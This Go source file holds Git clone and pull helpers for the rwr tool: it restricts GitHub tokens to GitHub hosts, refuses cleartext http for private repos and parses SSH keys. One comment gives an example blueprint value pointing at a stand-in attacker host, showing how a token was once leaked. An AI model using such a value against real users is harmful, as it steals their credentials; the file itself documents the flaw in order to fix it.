package helpers

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io/fs"
	neturl "net/url"
	"os"
	"path/filepath"
	"strings"

	"charm.land/log/v2"
	"github.com/fynxlabs/rwr/internal/types"
	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/config"
	"github.com/go-git/go-git/v5/plumbing/transport"
	"github.com/go-git/go-git/v5/plumbing/transport/http"
	"github.com/go-git/go-git/v5/plumbing/transport/ssh"
)

// HandleGitClone clones a Git repository to the specified path with optional
// authentication via SSH key, GitHub API token, or OAuth.
func HandleGitClone(opts types.GitOptions, initConfig *types.InitConfig) error {
	var auth transport.AuthMethod

	log.Debugf("Cloning Git repository: %s", opts.URL)

	// Use authentication for private repos or SSH URLs
	if opts.Private || strings.HasPrefix(opts.URL, "git@") {
		var err error
		auth, err = getAuthMethod(opts.URL, initConfig)
		if err != nil {
			return fmt.Errorf("error authenticating Git clone: %w", err)
		}
		log.Debugf("Using authentication for Git clone: %s", opts.URL)
	} else {
		log.Debugf("No authentication needed for Git clone: %s", opts.URL)
	}

	targetDir := filepath.Dir(opts.Target)
	// 0755, not os.ModePerm: 0777 through a permissive umask is a directory
	// every local user can write, on a path about to hold a cloned repository.
	err := os.MkdirAll(targetDir, 0o755) // #nosec G301 -- parent of a blueprint-named clone target; 0755 so the checkout stays world-readable, never world-writable
	if err != nil {
		return fmt.Errorf("error creating target directory: %v", err)
	}

	_, err = git.PlainClone(opts.Target, false, &git.CloneOptions{
		URL:  opts.URL,
		Auth: auth,
	})
	if err != nil {
		return fmt.Errorf("error cloning Git repository: %v", err)
	}

	log.Infof("Git repository cloned to: %s", opts.Target)

	// Check and update remote URL if necessary
	err = CheckAndUpdateRemoteURL(opts.Target, opts.URL)
	if err != nil {
		return fmt.Errorf("error checking/updating remote URL: %v", err)
	}

	return nil
}

// CheckAndUpdateRemoteURL verifies and updates the origin remote URL of an
// existing Git repository if it differs from the desired URL.
func CheckAndUpdateRemoteURL(repoPath, desiredURL string) error {
	repo, err := git.PlainOpen(repoPath)
	if err != nil {
		return fmt.Errorf("error opening Git repository: %v", err)
	}

	remote, err := repo.Remote("origin")
	if err != nil {
		return fmt.Errorf("error getting remote 'origin': %v", err)
	}

	currentURL := remote.Config().URLs[0]
	if currentURL != desiredURL {
		log.Infof("Updating remote URL from %s to %s", currentURL, desiredURL)

		// Remove the existing remote
		err = repo.DeleteRemote("origin")
		if err != nil {
			return fmt.Errorf("error removing existing remote: %v", err)
		}

		// Create a new remote with the updated URL
		_, err = repo.CreateRemote(&config.RemoteConfig{
			Name: "origin",
			URLs: []string{desiredURL},
		})
		if err != nil {
			return fmt.Errorf("error creating new remote with updated URL: %v", err)
		}
		log.Infof("Remote URL updated successfully")
	}

	return nil
}

// githubHosts are the hosts the configured GitHub token may be sent to.
var githubHosts = map[string]bool{
	"github.com":     true,
	"www.github.com": true,
	// Cloning a file from a repository goes through the raw content host.
	"raw.githubusercontent.com": true,
}

// getAuthMethod picks the credential for a remote, and returns an error rather
// than a credential when honouring the request would leak one.
//
// The URL comes from a blueprint, so it is attacker-controlled input whenever a
// blueprint is: this used to attach the user's GitHub token to every non-SSH
// remote, which meant `{url: "http://attacker.tld/r.git", private: true}` mailed
// the PAT to the attacker in cleartext. The token now goes to GitHub's hosts and
// nowhere else, and http:// is refused for private repos outright - there is no
// safe way to send a credential over it.
func getAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
	if !strings.HasPrefix(rawURL, "git@") {
		return getHTTPAuthMethod(rawURL, initConfig)
	}
	return getSSHAuthMethod(initConfig)
}

// getHTTPAuthMethod returns the token for GitHub remotes and no credential for
// every other host, so a non-GitHub remote is cloned anonymously rather than
// handed a secret it has no claim to.
func getHTTPAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
	parsed, err := neturl.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("invalid repository URL %q: %w", rawURL, err)
	}

	if parsed.Scheme == "http" {
		return nil, fmt.Errorf("refusing to use %q: http:// sends the repository credential in cleartext, use https:// instead", rawURL)
	}
	if parsed.Scheme != "https" {
		return nil, fmt.Errorf("refusing to use %q: only https:// and git@ remotes support authentication", rawURL)
	}

	if !githubHosts[strings.ToLower(parsed.Hostname())] {
		log.Warnf("Not sending the GitHub token to %s: it is not a GitHub host; cloning without authentication", parsed.Hostname())
		return nil, nil
	}

	token := initConfig.Variables.Flags.GHAPIToken
	if token == "" {
		log.Debugf("No GitHub token configured; cloning %s without authentication", rawURL)
		return nil, nil
	}

	return &http.BasicAuth{
		Username: "git",
		Password: token,
	}, nil
}

// ErrUnusableSSHKey is returned when a configured ssh key value is neither a
// readable file nor recognisable key material. It is a sentinel so callers and
// tests can identify the condition without matching on message text, which
// would otherwise be the only handle on it - and the message deliberately
// carries only a truncated preview of the value.
var ErrUnusableSSHKey = errors.New("ssh key is neither a readable file nor recognisable key material")

// sshKeyEncodings are the base64 alphabets a hand-written --ssh-key value
// might arrive in. Padded and unpadded, standard and URL-safe: which one an
// operator's tooling emits is not something rwr gets to choose, and the cost
// of trying all four is four failed string decodes.
var sshKeyEncodings = []*base64.Encoding{
	base64.StdEncoding,
	base64.RawStdEncoding,
	base64.URLEncoding,
	base64.RawURLEncoding,
}

// sshKeyMaterial decides whether a configured ssh key value is the key itself
// rather than a path to it, and returns the PEM bytes when it is.
//
// Two forms count as the key itself:
//
//   - the PEM as written, in any line ending.
//   - base64 of that PEM, in any of the four alphabets above, wrapped at any
//     column or not at all. This is the form set_as_rwr_ssh_key writes into
//     repository.ssh_private_key and the form --ssh-key documents, and nothing
//     decoded it at all until recently.
//
// One guard decides both: the bytes have to look like a private key. That is
// what makes the classification honest in each direction.
//
//   - A newline does not identify key material. Testing for one caught
//     column-wrapped base64 first and handed it to go-git as PEM, which it is
//     not, because Go's base64 decoder ignores embedded LF and CRLF and would
//     have decoded it perfectly well.
//   - A successful decode does not identify key material either. A bare
//     filename can be valid base64 by accident ("config" round-trips), so
//     decoded bytes that are not a private key leave the value a path.
//
// An "ssh-" prefix deliberately does not count, though it used to. It only
// ever matches a public key ("ssh-rsa AAAA..."), and this flow hands its bytes
// to ssh.NewPublicKeys, which needs the private half - so that branch could
// never produce a working credential, only a worse error. What it did do is
// swallow real paths: a key file named "ssh-key" or "ssh-private.pem" was
// parsed as key data and failed with "ssh: no key found" instead of being
// read.
//
// The raw form is checked first because a private key PEM cannot decode as
// base64 under any of the four alphabets - it contains spaces, which none of
// them ignore - so the order costs nothing and saves four decode attempts on
// the common case.
func sshKeyMaterial(value string) ([]byte, bool) {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return nil, false
	}

	if looksLikePrivateKey([]byte(trimmed)) {
		log.Debugf("Using the SSH key material as supplied")
		return []byte(value), true
	}

	for _, encoding := range sshKeyEncodings {
		decoded, err := encoding.DecodeString(trimmed)
		if err != nil || !looksLikePrivateKey(decoded) {
			continue
		}
		log.Debugf("Using base64-encoded SSH key material")
		return decoded, true
	}

	return nil, false
}

// looksLikePrivateKey reports whether bytes are plausibly a private key, so a
// path that happens to decode as base64 is not mistaken for one.
//
// Every PEM private key rwr can authenticate with says so in its header:
// OPENSSH, RSA (PKCS#1), PKCS#8 and the encrypted forms all contain
// "PRIVATE KEY". A public key does not, and could not be used here anyway.
func looksLikePrivateKey(data []byte) bool {
	return strings.Contains(string(data), "PRIVATE KEY")
}

// truncateForError keeps a bad ssh key value out of the log at full length: it
// may be the key itself, and the point of the message is which value was
// rejected, not what it contained.
func truncateForError(value string) string {
	const max = 32
	if len(value) <= max {
		return value
	}
	return value[:max] + "..."
}

func getSSHAuthMethod(initConfig *types.InitConfig) (transport.AuthMethod, error) {
	// Use the specified SSH key or try to find a suitable key
	sshKeyValue := initConfig.Variables.Flags.SSHKey

	// The value is key material (raw or base64) or a path to a key file.
	if sshKeyValue != "" {
		if material, ok := sshKeyMaterial(sshKeyValue); ok {
			auth, err := ssh.NewPublicKeys("git", material, "")
			if err != nil {
				return nil, fmt.Errorf("error creating SSH authentication from the supplied key: %w", err)
			}
			return auth, nil
		}

		// Treat as a file path. Any stat failure disqualifies it, not just
		// ENOENT: a base64 blob that failed to decode stats as ENAMETOOLONG,
		// and reporting that as "error creating SSH authentication from file:
		// open LS0tLS1CRUdJTi...: file name too long" told the operator
		// nothing about what was actually wrong.
		//
		// The PathError's own Err is what gets wrapped, never the PathError
		// itself: its message repeats the whole path, and when this value is
		// key material rather than a path that is the private key going into
		// an error string.
		if _, err := os.Stat(sshKeyValue); err != nil {
			reason := err
			var pathErr *fs.PathError
			if errors.As(err, &pathErr) {
				reason = pathErr.Err
			}
			return nil, fmt.Errorf("%w (%q): %v", ErrUnusableSSHKey, truncateForError(sshKeyValue), reason)
		}

		auth, err := ssh.NewPublicKeysFromFile("git", sshKeyValue, "")
		if err != nil {
			return nil, fmt.Errorf("error creating SSH authentication from file: %w", err)
		}
		return auth, nil
	}

	// No SSH key specified, try to find a suitable key file
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("error getting user home directory: %w", err)
	}

	// List of common SSH key locations to try
	possibleKeys := []string{
		filepath.Join(homeDir, ".ssh", "id_rsa"),
		filepath.Join(homeDir, ".ssh", "git"),
		filepath.Join(homeDir, ".ssh", "id_ed25519"),
		filepath.Join(homeDir, ".ssh", "github_rsa"),
		filepath.Join(homeDir, ".ssh", "id_ecdsa"),
	}

	// Try each possible key location
	sshKeyPath := ""
	for _, keyPath := range possibleKeys {
		if _, err := os.Stat(keyPath); err == nil {
			sshKeyPath = keyPath
			log.Debugf("Found SSH key at: %s", sshKeyPath)
			break
		}
	}

	if sshKeyPath == "" {
		return nil, fmt.Errorf("no SSH key found in common locations: specify an SSH key path or Base64-encoded key")
	}

	auth, err := ssh.NewPublicKeysFromFile("git", sshKeyPath, "")
	if err != nil {
		return nil, fmt.Errorf("error creating SSH authentication: %w", err)
	}
	return auth, nil
}

// HandleGitPull pulls the latest changes from a remote Git repository,
// using the configured authentication method if available.
func HandleGitPull(opts types.GitOptions, initConfig *types.InitConfig) error {
	log.Debugf("Pulling changes from Git repository: %s", opts.Target)
	repo, err := git.PlainOpen(opts.Target)
	if err != nil {
		log.Errorf("Error opening Git repository: %v", err)
		return fmt.Errorf("error opening Git repository: %v", err)
	}

	worktree, err := repo.Worktree()
	if err != nil {
		log.Errorf("Error getting worktree: %v", err)
		return fmt.Errorf("error getting worktree: %v", err)
	}

	// Get the remote URL to determine if we need authentication
	remote, err := repo.Remote("origin")
	if err != nil {
		log.Errorf("Error getting remote 'origin': %v", err)
		return fmt.Errorf("error getting remote 'origin': %v", err)
	}

	var auth transport.AuthMethod
	if len(remote.Config().URLs) > 0 {
		remoteURL := remote.Config().URLs[0]
		// For SSH URLs (git@...) or if the repo is marked as private, use authentication
		if strings.HasPrefix(remoteURL, "git@") || opts.Private {
			auth, err = getAuthMethod(remoteURL, initConfig)
			if err != nil {
				return fmt.Errorf("error authenticating Git pull: %w", err)
			}
			log.Debugf("Using authentication for Git pull: %s", opts.Target)
		} else {
			log.Debugf("No authentication needed for Git pull: %s", opts.Target)
		}
	}

	err = worktree.Pull(&git.PullOptions{
		Auth: auth,
	})
	if err != nil && !errors.Is(err, git.NoErrAlreadyUpToDate) {
		if pullErr := explainGitPullFailure(opts.Target, err); pullErr != nil {
			return pullErr
		}
		log.Errorf("Error pulling changes from Git repository: %v", err)
		return fmt.Errorf("error pulling changes from Git repository: %v", err)
	}

	log.Infof("Git repository updated: %s", opts.Target)
	return nil
}

func explainGitPullFailure(target string, err error) error {
	if !errors.Is(err, git.ErrNonFastForwardUpdate) {
		return nil
	}
	return &GitDivergenceError{Path: target, Err: err}
}

// GitDivergenceError reports a pull that cannot be fast-forwarded. RWR does
// not attempt a merge, rebase, reset, checkout, or force update in response.
type GitDivergenceError struct {
	Path string
	Err  error
}

func (e *GitDivergenceError) Error() string {
	return fmt.Sprintf("repository %s has local and remote history that cannot be fast-forwarded; left the working tree unchanged so in-progress work is not merged, rebased, reset, or overwritten; reconcile it manually: %v", e.Path, e.Err)
}

func (e *GitDivergenceError) Unwrap() error { return e.Err }
